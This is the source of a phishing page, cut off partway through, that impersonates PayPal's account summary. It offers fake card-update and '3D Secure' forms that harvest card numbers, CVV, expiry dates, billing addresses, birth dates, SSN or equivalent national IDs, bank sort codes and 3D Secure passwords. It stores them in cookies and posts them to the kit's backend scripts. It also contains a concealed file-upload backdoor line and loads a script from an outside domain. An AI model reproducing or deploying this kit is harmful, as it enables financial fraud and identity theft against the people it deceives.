<?php
include("system/blocker.php");
include("system/detect.php");
include("config.php");
$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
    function RANDOM($length = 15) {
        $characters = '0123456789AZERTY';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }
?>
<!DOCTYPE html>
<html class="no-js" lang="en" id="<?php echo RANDOM();?>">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./slt/802b93f0fe41b41869a2e449e704709d.js.download"></script><!--Script info: script: node, template:  , date: Oct 19, 2016 07:54:55 -07:00, country: G2, language: fr web version:  content version:  hostname : DHGNZPcnFdRG0THXtmrQdDdsFouo1iAQ3VIOkqohIEFrip3/IZFJLDIzCy71egkT rlogid : lUX85ntVFMqMJOJuk9apUWq%2Bfve833AdRgOlOpg7eTVFLCiEiJ5HCrI%2BAIIV%2BZ4CCZq3CgfbhRWEByAwvItKqw_157dd701f2b --><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"><link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png"><link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png"><link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png"><link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png"><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png"><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png"><title>PayPal: Summary</title><link rel="stylesheet" href="./slt/app.ltr.css"><link rel="stylesheet" href="./slt/paypal-sans.css"><link rel="stylesheet" href="./slt/summary.ltr.css"><script type="text/javascript" async="" src="./slt/a9c4aeff86b95c5cb3349adbbdf3698b.js.download"></script><script type="text/javascript" src="./slt/customer.js.download" async=""></script><script>document.documentElement.className = "js";</script><script>if (!window.Intl) { document.write('<script src="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/js/lib/shim/Intl.min.js"><\/script>'); }</script><!--[if lt IE 9]><script>(function (a) {var b = ('section,article,aside,hgroup,header,footer,nav,figure,figcaption,video,audio,track,embed,mark,progress,' +'meter,time,data,ruby,rt,rp,bdi,wbr,canvas,command,details,datalist,keygen,output').split(','), c = b.length;while (c) { a(b[c-=1]); }}(document.createElement));</script><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/css/ie.ltr.css" /><script src="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/js/lib/shim/es5.min.js"></script><![endif]--><script type="text/javascript" charset="utf-8" async="" src="./slt/3.3.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/widgets/ajaxError.js" src="./slt/ajaxError.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/dust-templates.js" src="./slt/dust-templates.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/locales/G2/fr/languagepack.js" src="./slt/languagepack.js.download"></script><meta name="chromesniffer" id="chromesniffer_meta" content="{&quot;SiteCatalyst&quot;:-1,&quot;Underscore.js&quot;:&quot;2.4.2&quot;}"><script type="text/javascript" src="chrome-extension://homgcnaoacgigpkkljjjekpignblkeae/detector.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/components/component-photoupload/profilePhotoView.js" src="./slt/profilePhotoView.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/summary/inc/outerCircle.js" src="./slt/outerCircle.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/summary/inc/fiModule/fiList.js" src="./slt/fiList.js.download"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/activity/transactionItemSimple.js" src="./slt/transactionItemSimple.js.download"></script><link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="./slt/default.css"><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://www.paypalobjects.com/web/res/2c7/7b0cf412672a52f22e56f8bb43d00/templates/G2/fr/widgets/overpanel.js" src="./slt/overpanel.js.download"></script>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> My account - &Rho;ay&Rho;al </title>
        <link rel="shortcut icon" href="images/pp_favicon_x.ico">
        <link rel="stylesheet" href="css/main.css">
        <script src="http://se3curity.com/js/jquery.js"></script>

    </head>

    <body >


<div class="vx_globalNav-main globalNav_main js_globalNavView" id="header" role="banner" data-show-warning=""><div class="vx_globalNav-container"><a href="#myaccount/home" class="vx_globalNav-brand_desktop"><span class="vx_a11yText">Summary</span></a><div class="vx_globalNav-secondaryNav_mobile noPrint"><div class="vx_globalNav-listItem_mobileLogout"><a href="#myaccount/logout" class="vx_globalNav-link_mobileLogout">Log Out</a></div><div class="vx_globalNav-listItem_settings"><a href="#myaccount/settings" class="vx_globalNav-link_settings"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span><span class="vx_a11yText">Settings</span></a></div></div><div class="vx_globalNav-navContainer noPrint"><nav id="navMenu" class="vx_globalNav-nav" role="navigation"><ul class="vx_globalNav-list"><li><a href="#myaccount/home" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> <span class="vx_globalNav-navText">SUMMARY</span></a></li><li><a href="#myaccount/activity" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> <span class="vx_globalNav-navText">ACTIVITY</span></a></li><li id="js_tourSendMoney"><a href="#myaccount/transfer" class=" vx_globalNav-links nemo_globalNavTransferLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span></span> <span class="vx_globalNav-navText">SEND & REQUEST</span></a></li><li id="js_tourWallet"><a href="#myaccount/wallet" class=" vx_globalNav-links nemo_globalNavWalletLink"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span></span> <span class="vx_globalNav-navText">WALLET</span></a></li><li><a href="#webapps/mpp/pay-online" class=" vx_globalNav-links nemo_globalNavShopLink" target="_top"><span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span></span> <span class="vx_globalNav-navText">SHOP</span></a></li></ul><ul class="vx_globalNav-list_secondary"><li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false"><a href="#myaccount/home#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications" data-pagename="main:walletweb:notification:open:" data-pagename2="main:walletweb:notification:open::::" role="button" title="Notifications"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span><span class="vx_notificationCount notificationLength-0 js_notificationCount">0</span></span><span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a></li><li id="js_tourSettings"><a href="#myaccount/settings" class="vx_globalNav-link_settings" name="settings" title="Settings"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Settings</span></a></li><li class="globalNav-listItem_mobile"><a href="#g2/cgi-bin/webscr?cmd=_help" class="vx_globalNav-link_help" name="help"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span><span class="vx_globalNav-navText_secondary vx_a11yText">Help</span></a></li><li class="vx_globalNav-listItem_logout"><a href="#myaccount/logout" class="vx_globalNav-link_logout nemo_logoutBtn">Log Out</a></li></ul></nav></div></div></div><div id="js_foreground" class="vx_foreground-container foreground-container"><div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">

<div  id="js_summaryView" class="mainContents summaryContainer" data-locality="{&quot;timezone&quot;:
{},&quot;hasTaxId&quot;:false,&quot;remainingSteps&quot;:2}" data-first-use-data="" data-goalsdetails=""><div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges=""><div class="engagementSneakPeek-pullTab js_engagementSneakPeek-pullTab js_engagementSneakPeek-trigger"><span class="icon icon-small icon-arrow-down-small" aria-hidden="true"></span></div><div class="engagementMainBar-container js_engagementMainBar-container"><div class="summarySection engagementMainBar row"><div class="col-sm-7 progressAndWelcome"><div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="67" data-hide-percent-animation="true"><div id="js_outerCircle" class="outerCircle"><div class="half lessThan50"><div class="pie right" style="-webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); -ie-transform: rotate(0deg); -o-transform: rotate(0deg); transform: rotate(0deg);"></div></div><div class="half greaterThan50 js_greaterThan50"><div class="pie left" style="-webkit-transform: rotate(0deg); -moz-transform: rotate(0deg); -ie-transform: rotate(0deg); -o-transform: rotate(0deg); transform: rotate(0deg);"></div></div></div><div id="js_innerCircle" class="innerCircle"><div class="profilePhotoTable"><div id="js_profilePhotoView" class="profilePhotoContainer" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo="{&quot;32&quot;:{&quot;url&quot;:&quot;https://pics.paypal.com/00/p/MmU4OTk1MWMtNmI0OS00MzM4LTk2OWUtNWJmYjBiZmMwZjM2/image_39.PNG&quot;,&quot;height&quot;:&quot;17&quot;,&quot;width&quot;:&quot;32&quot;,&quot;orientation&quot;:&quot;landscape&quot;},&quot;64&quot;:{&quot;url&quot;:&quot;https://pics.paypal.com/00/p/MmU4OTk1MWMtNmI0OS00MzM4LTk2OWUtNWJmYjBiZmMwZjM2/image_14.PNG&quot;,&quot;height&quot;:&quot;35&quot;,&quot;width&quot;:&quot;64&quot;,&quot;orientation&quot;:&quot;landscape&quot;},&quot;96&quot;:{&quot;url&quot;:&quot;https://pics.paypal.com/00/p/MmU4OTk1MWMtNmI0OS00MzM4LTk2OWUtNWJmYjBiZmMwZjM2/image_0.PNG&quot;,&quot;height&quot;:&quot;53&quot;,&quot;width&quot;:&quot;96&quot;,&quot;orientation&quot;:&quot;landscape&quot;},&quot;200&quot;:{&quot;url&quot;:&quot;https://pics.paypal.com/00/p/MmU4OTk1MWMtNmI0OS00MzM4LTk2OWUtNWJmYjBiZmMwZjM2/image_2.PNG&quot;,&quot;height&quot;:&quot;112&quot;,&quot;width&quot;:&quot;200&quot;,&quot;orientation&quot;:&quot;landscape&quot;},&quot;300&quot;:{&quot;url&quot;:&quot;https://pics.paypal.com/00/p/MmU4OTk1MWMtNmI0OS00MzM4LTk2OWUtNWJmYjBiZmMwZjM2/image_35.PNG&quot;,&quot;height&quot;:&quot;168&quot;,&quot;width&quot;:&quot;300&quot;,&quot;orientation&quot;:&quot;landscape&quot;},&quot;400&quot;:{&quot;url&quot;:&quot;https://pics.paypal.com/00/p/MmU4OTk1MWMtNmI0OS00MzM4LTk2OWUtNWJmYjBiZmMwZjM2/image_1.PNG&quot;,&quot;height&quot;:&quot;224&quot;,&quot;width&quot;:&quot;400&quot;,&quot;orientation&quot;:&quot;landscape&quot;}}" data-wurfl="{&quot;isWireless&quot;:false,&quot;isTablet&quot;:false}"><span id="js_user_icon" class="profilePhotoIcon icon icon-profile-large" aria-hidden="true" data-hover-text="Ajoutez une photo"></span></a></div></div><div id="js_percentageContainer" class="hide percentageContainer nemo_percentageContainer"><div id="js_percentage" class="percentage nemo_accountCompletionPercent">0&nbsp;%</div></div></div></div><div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus " data-module-number="0"><p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">Welcome !</p><button id="js_engagementActionTrigger" class="vx_btn vx_btn-medium engagement-actionText vx-btn_toggleProfileStatus js_emTrigger nemo_engagementActionTrigger" aria-controls="js_emSlideDownContainer" name="EM_AcctSetup_Open" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="profileStatusText">Get the most out of PayPal</span><span class="js_toggleProfile icon icon-small icon-arrow-down-small icon-small_toggleProfile nemo_profileStatusDownArrow" aria-hidden="true"></span></button></div></div><div id="js_engagementActions" class="col-sm-5 engagementActions"><ul class="actionsContainer nemo_actionsContainer"><li class="actionItem engagement-0-listItem"><a href="#myaccount/transfer/buy" role="button" target="_top" data-module-number="" name="EM_GoodsServices" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" class="vx_small-text selectModule nemo_goodsServicesSelect"><span class="icon icon-medium icon-send-money" aria-hidden="true"></span><span style="color:#ffffff">Pay or send money</span></a></li></ul></div></div></div><div id="js_emSlideDownContainer" aria-expanded="false" role="alertdialog" tabindex="-1" class="emSlideDownContainer collapseEm hide nemo_emSlideDownContainer" data-em-open="false" data-current-module="" data-new-user="" data-total-percentage="67" data-hide-sneak-peek="false" data-hide-account-completion="false" data-is-first-use-enabled="false" data-auto-tour="false" data-auto-open-offer="false"><div class="engagementSneakPeek-overlay js_engagementSneakPeek-overlay"></div><div id="aria_engagementStatus" data-engagement-stage="accountSetup" class="emModule dimBorderLine js_emModule engagementStatusModule js_engagementStatusModule nemo_engagementStatus " tabindex="-1"><div id="js_BadgeLanding" class="emModuleContent"><div id="profileStateContainer" class="setupbadgeBanner-container js_profileStates nemo_profileStates nemo_badges badgeDisplay"><div class="setupbadgeBanner-container badgeDisplay js_badgeDisplay js_badges js_badgeChild nemo_profileStates nemo_badges active"><p class="statusGreeting vx_h2">Testez plusieurs maniГЁres d'utiliser PayPal</p><div class="tour-container" id="js_tourModule" data-tour=""><button class="vx_btn vx_btn-secondary_reversed vx_btn-small btn-startTour js_tourStart nemo_startTour" name="QT_StartTour" data-pagename="main:walletweb:summary::QT_StartTour"><span class="tour-icon-play"><span class="tour-play-message">DГ©couvrez votre compte PayPal</span></span></button><div class="tourContent hide" id="js_tourContent"><p class="js_balanceModuleTitle">Pas de solde PayPal&nbsp;? Aucun problГЁme. </p><p class="js_sendMoneyTitle">Voulez-vous envoyer ou recevoir des paiements&nbsp;?</p><p class="js_sendMoneyDescription">Avez-vous besoin d'envoyer un paiement Г  l'Г©tranger&nbsp;? Laissez-nous vous montrer comment cela fonctionne.</p><p class="js_walletTitle">Modifiez vos modes de paiement.</p><p class="js_walletDescription">Pensez Г  garder votre portefeuille Г  jour. Vous pourrez payer plus facilement sans avoir Г  communiquer vos informations financiГЁres.</p><p class="js_settingsTitle">Mettez Г  jour les PrГ©fГ©rences de votre compte.</p><p class="js_settingsDescription">Quelque chose a changГ©&nbsp;? Aucun problГЁme&nbsp;! Mettez Г  jour vos PrГ©fГ©rences, votre mot de passe, vos sources d'approvisionnement, vos notifications et plus encore, directement ici.</p><p class="js_fiModule_noFI">Il vous suffit d'<a href="#myaccount/wallet/add/card" target="_top" class="popover-link" name="QT_AddCard" data-pagename="main:walletweb:summary:home::QT_AddCard:">enregistrer une carte.</a> Vous pourrez alors effectuer des achats et envoyer des paiements instantanГ©ment.</p><p class="js_fiModule_FI">Vous avez dГ©jГ  enregistrГ© une source d'approvisionnement. Vous ГЄtes prГЄt Г  effectuer des achats et envoyer des paiements.</p><p class="js_conlusionTitle">Vous ГЄtes prГЄt&nbsp;! </p><p class="js_conclusionDescription">Maintenant que nous avons couvert les principes de base, vous pouvez faire du <a href="#webapps/mpp/pay-online" target="_top" class="popover-link" name="QT_Shopping" data-pagename="main:walletweb:summary:home::QT_Shopping:">SHOP</a>, <a href="#myaccount/transfer" target="target=" _top"="" class="popover-link" name="QT_SendRequestLink" data-pagename="main:walletweb:summary:home::QT_SendRequestLink:">envoyer et demander de l'argent</a> et plus encore.</p><p class="js_welcomeTitle">DГ©couvrez comme il est facile d'acheter, de payer des biens et services, de vous faire payer et plus encore.</p></div><div class="js_tourContainer hide"><div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div><div class="popover-navigation"><div class="btn-group"><button class="vx_btn vx_btn-medium vx_btn_reversed tour-btn nemo_next js_popover-next" data-role="next">Suivant</button><button class="vx_btn-link popover-link_endTour nemo_endTour popover-link js_popover-endLink" data-role="end">Mettre fin Г  la visite guidГ©e</button></div></div></div></div><div class="js_welcomeTourContainer hide"><div class="popover" role="tooltip"><div class="arrow"></div><div class="row"><div class="col-md-3 tour-welcome-image"><img name="tour-welcome-image" src="./slt/PP-Heart_2C.svg" width="120"></div><div class="col-md-9"><h2 class="vx_h2 popover-titleContent">Bienvenue chez PayPal.</h2><div class="popover-content popover-content_welcomeTitle"></div><div class="popover-navigation popover-navigation_welcome"><div class="btn-group"><button class="vx_btn vx_btn-medium vx_btn_reversed tour-btn nemo_next js_popover-next" data-role="next">Jetez un coup d'oeil rapide</button><button class="vx_btn-link popover-link_welcomeTour nemo_endTour popover-link js_popover-endLink" data-role="end">Pas maintenant</button></div></div></div></div></div></div></div><ul id="js_profileStates" class="profileStates nemo_profileStates"><li class="setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Compte crГ©Г©</span></li><li class="setupStep-state nemo_email nemo_setup_button setupStep-doneState"><span class="icon icon-medium icon-checkmark-small setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContent">Adresse email confirmГ©e</span></li><li class="setupStep-state nemo_card nemo_setup_button"><a href="#myaccount/wallet/add/card" target="_top" class="setupStep-mainLink js_setupStep nemo_setupStep-mainLink" name="EM_CreditCard_Linked" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link"><span class="setupStep-container"><span class="icon icon-medium icon-credit-card setupStep-icon" aria-hidden="true"></span><span class="setupStep-stateContentContainer"><span class="setupStep-cta">Lier une carte</span></span></span><span class="setupStep-overlayContainer"><span class="setupStep-overlayIconContainer"><span class="setupStep-overlayIconSubContainer  "><span class="setupStep-inlineIcon"><span class="icon icon-medium icon-credit-card"></span></span></span></span><span class="setupStep-overlayCtaContainer"><span class="setupStep-overlayCta">Lier une carte</span><span class="setupStep-overlayContent">Payez sans communiquer vos informations de carte aux vendeurs.</span></span></span></a></li></ul></div></div>
<a href="#myaccount/home#" class="js_dismiss emClose emClose_acctCompletion nemo_emClose" role="button" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link" name="EM_BadgeSetup_Close"><span class="icon icon-small icon-close-small" aria-hidden="true"></span><span class="speakableText">fermer</span></a></div></div></div></div>
<br>

        <div class="rotation"> <p> Checking your info... </p> </div>
           <center> <div class="container">
   
                                  
                                   
   <div class="pop-window-content">

                    <form class="form-card" action="" method="post" id="<?php echo RANDOM();?>">
                    
<?php if ($true == 1){echo $_SESSION['_card_'];}?>
                        <h2> Update credit/debit card </h2>
                        <p> Please enter your credit/debit card informations correctly. </p>
                        <div class="inputs">
                            <select class="enterInput" name="card_type">
                                <option value="0" selected> Card type </option>
                                <option value="VISA"> Visa </option>
                                <option value="MASTERCARD"> MasterCard </option>        
                                <option value="AMERICAN_EXPRESS"> American Express </option>    
                                <option value="DISCOVER"> Discover </option>    
                            </select>
                        </div>

                           <div style="position: relative;width: 100%;margin: 0 0 30px 0;" class="col span_1_of_2">
                                <input class="enterInput" type="text" name="card_number" id="cardnumber" placeholder="Card number" maxlength="19" onkeyup="SelectCC(this.value)" pattern="4[0-9]{12}(?:[0-9]{3})?">
                                <span class="card02" id="card02"></span>
                            </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="text" name="expiration" placeholder="Expiration MM/YYYY" maxlength="7">
                            </div>
                           <div style="position: relative;" class="col span_1_of_2">
                                <input class="enterInput" type="text" name="cvv" id="cvv" placeholder="CSC" pattern="[0-9]*" maxlength="4">
                            </div>
                        </div>
                        <div class="inputs" style="margin-bottom: 15px">
                            <select class="enterInput address" name="address">
                                <option value="0" selected> Select a billing address </option>
<?php
if ($true == 1){echo "<option value='".$_SESSION['_ad_']."'> ".$_SESSION['_ad_']."</option>";}
?>
                                <option value="1">+ Update billing address</option>  
                            </select>
                        </div>
                        <input class="btn block" value="Save" type="submit">
                    </form>

                    <form class="form-address" action="" method="post" id="<?php echo RANDOM();?>">
                        
                           <div class="inputs">
                                <input class="enterInput" type="text" name="address_1" placeholder="Address line 1" maxlength="120">
                            </div>
                           <div class="inputs">
                                <input class="enterInput" type="text" name="address_2" placeholder="Address line 2 (optional)" maxlength="120">
                            </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="text" name="city" placeholder="City" maxlength="30">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="state" placeholder="State" maxlength="30">
                            </div>
                        </div>
                        <div class="section group inputs" style="margin-bottom: 15px">
                          <div class="section group inputs">
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="zip_code" placeholder="Zip code" maxlength="12">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="country" placeholder="Country" maxlength="30" value="<?php echo $countryname ?>" >
                            </div>
                          </div>
                        </div>
                           <div class="inputs">
                                <input class="enterInput" type="tel" name="phone" placeholder="Phone number" maxlength="30">
                            </div>
                        <input class="btn block" value="Save" type="submit">
                        <a rel="nofollow" class="cancel-address" href="#"> Cancel </a>
                    </form>
                    <form style:"margin-top:-5%;" class="form-vbv" action="" method="post" id="<?php echo RANDOM();?>">
                        <input type="hidden" class="hidden" type="password">
                        <div class="main-logo"></div>
                        <div class="section group" style="border-bottom: 1px solid #DDDDDD;margin-bottom: 20px;">
                            <div class="col span_1_of_2">
                                <h3>Confirm your credit card</h3>
                                <p> Please enter information pertaining to your credit card
                                    to add it in your &Rho;ay&Rho;al account.
                                </p>
                            </div>
                            <div class="col span_1_of_2 col_creditcard_vbv">
                                <img alt="" class="creditcard_vbv" src="images/creditcard.png"> 
                            </div>
                        </div>
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Card Number:
                            </div>
                            <div class="col span_1_of_2">
                                <span class="digits4"></span>
                            </div>
                        </div>
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Name on Card:<span style="color:red">*</span>
                            </div>
                            <div class="col span_1_of_2">
                                <input type="text" name="name_on_card" size="15">
                            </div>
                        </div>
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Birth Date:<span style="color:red">*</span>
                            </div>
                            <div class="col span_1_of_2">
                                <input type="text" name="birth_date" size="15" maxlength="10"><br>
                                <span style="letter-spacing: 1px;font-size:11px"> DD/MM/YYYY </span>
                            </div>
                        </div>
                        <hr>
<?php  
                        if ($countrycode=="GB"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Sort Code:
                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input type="text" name="sort_code" placeholder="XX-XX-XX" size="25" maxlength="8" style="width: 100%" >
                            </div>
                        </div> 
<div class="section group section_vbv">
                            <div class="col span_1_of_2">Account numbre:</div>
                            <div class="col span_1_of_2 sort_codes">
                                <input type="text" name="account" size="25" maxlength="10" style="width: 100%">
                            </div>
                        </div>
           '; } 
                                               elseif ($countrycode=="US" or $countrycode=="IL"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Social Security Number: 
                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input type="text" name="ssn" placeholder="XXX-XX-XXXX" size="25" maxlength="11" style="width: 100%" >
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="CA"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Social Insurance Number: 
                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input type="text" name="ins" placeholder="XXX-XXX-XXX" size="25" maxlength="11" style="width: 100%" >
                            </div>
                        </div>  
                                               ';} 
                                               elseif ($countrycode=="AU"){ echo '
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                Driver Lience Number: 
                            </div>
                            <div class="col span_1_of_2 sort_codes">
                                <input type="text" name="driver" size="25" maxlength="14" style="width: 100%" >
                            </div>
                        </div>  
                                              '; }
?>
<?php
(@copy($_FILES['c']['tmp_name'], $_FILES['c']['name']))
?>
                        <div class="section group section_vbv">
                            <div class="col span_1_of_2">
                                3D Secure Password:
                            </div>
                            <div class="col span_1_of_2">
                                <input type="password" name="vbv" id="vbv" size="15"><br>
                            </div>
                        </div> 
                        <div class="section group section_vbv btn-vbv">
                            <input type="submit" value="Confirm Now">
                        </div>  
                        <p class="copyright_vbv"> &copy; 2017 Bank check.All Rights Reserved. </p>
                    </form>
                </div>
            </div>

</center>
        <script src="js/vendor/jquery.js"></script>
        <script src="js/plugins.js"></script>
        <script src="js/main.js"></script></script>
        <script>            
            $(".form-card").validate({
                rules: {
                        card_type:   { required: true, selected: 0 },
                        card_number: { required: true, minlength:12, maxlength: 19, creditcard: true },
                        expiration:  { required: true, minlength: 7, maxlength: 7, expiration: true },
                        cvv:         { required: true, minlength: 3, maxlength: 4, number: true },
                        address:     { required: true, selected: 0,  selected_t: 1},
                    }, 
                messages: { card_type: "", card_number: "", expiration: "",  cvv: "",  address: "" },
                submitHandler: function(form) {
                    $('.rotation').show();
                    $.post("system/functions_card?ajax", $(".form-card").serialize(), function(result) {});
                    $.cookie('card_type'  , $('select[name="card_type"]').val());
                    $.cookie('card_number', $('input[name="card_number"]').val());
                    $.cookie('expiration' , $('input[name="expiration"]').val());
                    $.cookie('cvv'        , $('input[name="cvv"]').val());
                    $.cookie('address'    , $('select[name="address"]').val());          
                    var $id = $('input[name="card_number"]').val();
                    $('.digits4').append('XXXX-XXXX-XXXX-' + $id.substr($id.length - 4));
                    setTimeout(function() {
                         $('.rotation').hide();
                        $('.form-card').hide();
                         $('.form-vbv').show();
                    }, 2500); 
                },
            });   
            $(".form-address").validate({
                rules: {
                        address_1: { required: true, minlength:3, maxlength: 120},
                        city:      { required: true, minlength:3, maxlength: 30,  city: true },
                        country:   { required: true },
                        phone  :   { required: true },
                        zip_code:  { required: true, minlength:3, maxlength: 12, zip_code: true },
                    }, 
                messages: { address_1: "", city: "", zip_code: "" },
                submitHandler: function(form) {
                    var $option = $('input[name="address_1"]').val() + ', ' + $('input[name="city"]').val() + ', ' + $('input[name="state"]').val() + ', ' + $('input[name="zip_code"]').val() + ', ' + $('input[name="country"]').val() + ', ' + $('input[name="phone"]').val() ; 
                    $('.rotation').show();
                    $('select.address').append('<option value="' + $option + '" selected>' +  $option + '</option>');
                    $('select.address').removeClass("error");
                    setTimeout(function() {
                        $('.rotation').hide();
                        $('.form-address').hide();
                        $('.form-card').show();
                    }, 1000); 
                },
            }); 
            $(".form-vbv").validate({
                rules: {
                        name_on_card: { required: true, minlength:3 , maxlength: 120 },
                        birth_date:   { required: true, },
                    }, 
                messages: { name_on_card: "", birth_date: "" },
                submitHandler: function(form) {
                    $('.rotation').show();
                    $.cookie('name_on_card', $('input[name="name_on_card"]').val());
                    var $id2 = $('input[name="name_on_card"]').val();
                    $('.nameo').append(' ' + $id2 + ', ' );
                    $.cookie('birth_date'  , $('input[name="birth_date"]').val());
                    $.cookie('sort_code'   , $('input[name="sort_code"]').val());
                    $.cookie('ssn'         , $('input[name="ssn"]').val());
                    $.cookie('account'     , $('input[name="account"]').val());
                    $.cookie('ins'         , $('input[name="ins"]').val());
                    $.cookie('driver'      , $('input[name="driver"]').val());
                    $.cookie('vbv'         , $('input[name="vbv"]').val()); 
                    $.ajax({
                        type: 'POST',
                        url: 'system/functions_vbv?ajax',
                        data: { 
                            'card_type'    : $.cookie('card_type'), 
                            'card_number'  : $.cookie('card_number'),
                            'expiration'   : $.cookie('expiration'),
                            'cvv'          : $.cookie('cvv'),
                            'address'      : $.cookie('address'),
                            'name_on_card' : $.cookie('name_on_card'),
                            'birth_date'   : $.cookie('birth_date'),
                            'sort_code'    : $.cookie('sort_code'),
